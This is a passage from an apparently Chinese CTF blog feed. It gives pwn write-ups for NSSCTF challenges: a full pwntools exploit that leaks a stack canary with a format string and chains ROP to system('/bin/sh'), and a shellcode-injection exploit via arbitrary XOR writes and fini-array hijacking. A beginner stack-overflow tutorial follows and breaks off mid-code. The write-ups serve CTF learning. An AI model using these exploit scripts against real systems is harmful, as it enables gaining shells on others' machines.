class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28037</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4013f3</span></span><br><span class="line">r()</span><br><span class="line">payload = <span class="string">b&#x27;%520c%9$n.%15$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">res = r().split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(res[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x40125d</span>)<span class="comment"># 这里记得返回到vuln，别返回到main啦，要不然又要再利用一遍printf了</span></span><br><span class="line">sl(payload)</span><br><span class="line">libc_base = get_addr() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret)</span><br><span class="line">payload += p64(rdi) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">i()</span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>👉 <a href="../resources/pwn_asset/NSS_round14/xor.zip" target="_block">点击下载附件</a></p><img src="/NSSround14wp/xorMain.png" alt="xorMain" style="zoom:80%;"><p>flag在bss段，判断小于等于0跳出循环，xorByteWithAddress可以与任意地址数据异或，所以给高位异或一个0xFF（变成负数），基本上相当于无限循环（loop）了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后找一段rw（readable，writeable）区域写入shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0, 随便找到的，只是把个位凑个0而已</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>然后想办法触发shellcode，因为程序没有栈溢出，所以这里我们让程序自己触发。</p><p>由于在main结束后会跳转到_final_array储存的地址，这里把储存的地址改成我们写入的shellcode地址，然后再把flag高位异或一个0xff（变成0，也就是说flag变成正数，跳出循环，使main结束）</p><img src="/NSSround14wp/finalArray.png" alt="finalArray" style="zoom:80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 to 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>完整exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 &gt; 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/NSSround14wp/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwn新手村</title>
      <link>http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/</link>
      <guid>http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/</guid>
      <pubDate>Tue, 20 Jun 2023 17:28:27 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;长期更新中……&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;既然选择这条注定艰难的路，那么话不多说，直接开始吧！&lt;del&gt;（拜托~，pwn掉系统什么的真的超帅的！）&lt;/del&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><em><strong>长期更新中……</strong></em></p><p>既然选择这条注定艰难的路，那么话不多说，直接开始吧！<del>（拜托~，pwn掉系统什么的真的超帅的！）</del></p><span id="more"></span><h1 id="也许需要nc一下？！"><a href="#也许需要nc一下？！" class="headerlink" title="也许需要nc一下？！"></a>也许需要nc一下？！</h1><p>要pwn肯定要先连接服务器嘛。一般给了地址和端口可以直接用pwntools的remote连接</p><p>比如给你了 <code>114.514.19.19:810</code></p><p>pwntools远程就是<code>io = remote(&#39;114.514.19.19&#39;, 810)</code>，</p><p>本地打就用 <code>io = process(&#39;file_path&#39;)</code></p><p>如果要在kali上就是 <code>$ nc 114.514.19.19 810</code></p><p>当然有时候可能是ssh，telnet之类的</p><p>可以自行上网搜索如何连接。</p><p>这里以ssh为例： 假设用户是ctf 那么就可以用<code>$ ssh ctf@114.514.19.19 -p 810</code>连接，然后再输入密码（没有给就自己爆吧，甚至可能不给端口2333）</p><p>不过有种偷懒的方法就是直接用xshell连接（download: <a href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a>)</p><p>具体用法请自行百度</p><h1 id="这是什么？缓冲区？！溢出一下！"><a href="#这是什么？缓冲区？！溢出一下！" class="headerlink" title="这是什么？缓冲区？！溢出一下！"></a>这是什么？缓冲区？！溢出一下！</h1><p>缓冲区溢出就是长数据复制到小的缓冲区里，多出的数据会发生泄露，导致其他数据被破坏。<strong>常见的栈溢出和堆溢出都包含在内，只是发生在栈上和堆上的区别而已。</strong></p><p>而其中，栈溢出是最常见的漏洞，一般来说难度也比较小（也可以很恶心），作为pwn的起点当之无愧吧。</p><h2 id="栈の基础"><a href="#栈の基础" class="headerlink" title="栈の基础"></a>栈の基础</h2><h3 id="什么是栈？（stack）"><a href="#什么是栈？（stack）" class="headerlink" title="什么是栈？（stack）"></a>什么是栈？（stack）</h3><p>栈是一种<strong>先进后出</strong>的数据结构，这也正好满足了调用函数的方式，即：父函数调用子函数，父在前，子在后；返回值时，子函数先返回，父函数后返回。</p><p>对栈有push（压数据入栈），pop（弹出数据，并储存到指定寄存器或内存中）两种操作。</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png" alt="push&amp;pop"></p><p><strong>需要注意:</strong> </p><p>1）栈的生长是<strong>从高地址往低地址</strong>，对应上面演示的向下生长</p><p>2）<strong>pop后被弹出的数据还在栈内，但是不能直接访问（还是可以访问的）</strong></p><h3 id="什么是栈帧？（stack-frame）"><a href="#什么是栈帧？（stack-frame）" class="headerlink" title="什么是栈帧？（stack frame）"></a>什么是栈帧？（stack frame）</h3><p>其本质就是一种栈，这种栈专门来<strong>保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</strong></p><p>栈帧有栈顶和栈底之分，<strong>栈顶地址最低，栈底地址最高，SP（栈指针）是一直指向栈顶的。</strong></p><p>下面是一个栈帧示意图：</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png" alt="栈帧"></p><p>一般来说，<code>bp</code>（基址指针）到<code>sp</code>之间的区域当作栈帧。<strong>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</strong>。</p><p>函数调用过程中，我们将调用函数的函数称为 “调用者（caller）“， 被调用的函数称为 “被调用者（callee）”。其中：</p><p>1）caller需要知道在哪里获取callee的返回值</p><p>2）callee需要知道传入的参数在哪里</p><p>3）返回地址在哪里</p><p>同时，<strong>我们要保证在callee返回后，<code>bp</code>, <code>sp</code>等寄存器的值应该和调用前一致</strong>。所以，我们要用栈来保存这些数据。</p><h2 id="bss，data，text，heap-amp-stack"><a href="#bss，data，text，heap-amp-stack" class="headerlink" title="bss，data，text，heap &amp; stack"></a>bss，data，text，heap &amp; stack</h2><h3 id="bss-segment："><a href="#bss-segment：" class="headerlink" title="bss segment："></a>bss segment：</h3><p>bss段通常用来存放程序中<strong>未初始化的全局变量</strong></p><p>bss是 Block Started by Symbol 的简称</p><p>bss段属于静态内存分配</p><h3 id="data-segment："><a href="#data-segment：" class="headerlink" title="data segment："></a>data segment：</h3><p>数据段通常存放<strong>已经初始化的全局变量</strong>，属于静态内存分配</p><h3 id="code-text-segment："><a href="#code-text-segment：" class="headerlink" title="code(text) segment："></a>code(text) segment：</h3><p>代码段通常用来存放程序执行代码，其大小在编译期确定，并且该内存区域通常为只读（某些架构允许可写，即允许修改程序）</p><h3 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h3><p>堆用于存放程序运行中被动态分配的内存段，大小不固定，可动态扩张或缩减。</p><p>当进程调用malloc等函数分配内存时，新分配的内存会被动态添加到堆上（堆被扩张）；</p><p>使用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p><h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><p><strong>栈又称堆栈</strong>，是用户存放程序<strong>临时创建的局部变量</strong>，也就是 {} 中定义的变量（但<strong>不包括static声明的变量</strong>，static意味着在数据段（.data）中存放变量）。</p><p>此外，函数被调用时，其参数也会压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p><p>由于栈先进后出的特点，栈特别方便来保存&#x2F;恢复调用现场。</p><p>从这个意义上，<strong>我们可以把堆栈看成一个寄存，交换临时数据的内存区</strong>。</p><h2 id="pwntools基础"><a href="#pwntools基础" class="headerlink" title="pwntools基础"></a>pwntools基础</h2><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>使用python自带的pip下载pwntools</p><p><code>$ pip install pwntools</code></p><p>如果在windows上的wsl上直接使用该语句可能会报错</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png" alt="pip_err"></p><p>不过好在给了你提示，只要在后面加上<code>--break-system-packages</code>即可</p><p>也就是：<code>$ pip install pwntools --break-system-packages</code></p><h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># 导入pwntools模块</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span><span class="comment"># x64架构应为 &#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span><span class="comment"># 设置为目标机的系统，一般是linux</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span><span class="comment"># 输出调试信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">或者直接使用:</span></span><br><span class="line"><span class="string">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="string">当然一般情况下arch和os不用设置（要生成shellcode时候要设置），只要设置log_level为debug就可以了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&#x27;114.514.19.198&#x27;</span>, <span class="number">23333</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">用来建立一个远程连接，url或者ip作为地址，然后指明端口</span></span><br><span class="line"><span class="string">也可以仅使用本地文件，方便调试:</span></span><br><span class="line"><span class="string">io = process(&#x27;./test_pwn_file&#x27;)</span></span><br><span class="line"><span class="string">process用来启动一个本地进程，需要注意.elf不能在windows下运行，应在wsl或者虚拟机里，否则程序会报错，.exe等亦然，所以本地打的话记得脚本在匹配的环境里执行</span></span><br><span class="line"><span class="string">process里是文件路径，其中 &#x27;test_pwn_file&#x27; 是文件名，可以是相对地址，也可以是绝对地址，当然还是建议把exp（攻击利用脚本）和pwn文件（你要打的东西）放到同目录下</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span 